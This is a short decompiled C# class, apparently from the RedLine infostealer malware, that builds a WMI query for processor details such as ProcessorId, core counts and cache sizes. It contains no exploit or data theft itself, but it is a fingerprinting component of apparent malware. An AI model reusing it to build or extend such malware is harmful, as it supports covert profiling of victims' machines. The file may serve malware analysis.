using System;

namespace RedLine.Models.WMI
{
	// Token: 0x0200002A RID: 42
	public class WmiProcessorQuery : WmiQueryBase
	{
		// Token: 0x06000103 RID: 259 RVA: 0x000040CC File Offset: 0x000022CC
		public WmiProcessorQuery() : base("Win32_Processor", null, new string[]
		{
			"Manufacturer",
			"Caption",
			"Name",
			"ProcessorId",
			"NumberOfCores",
			"NumberOfLogicalProcessors",
			"L2CacheSize",
			"L3CacheSize",
			"SocketDesignation"
		})
		{
		}
	}
}
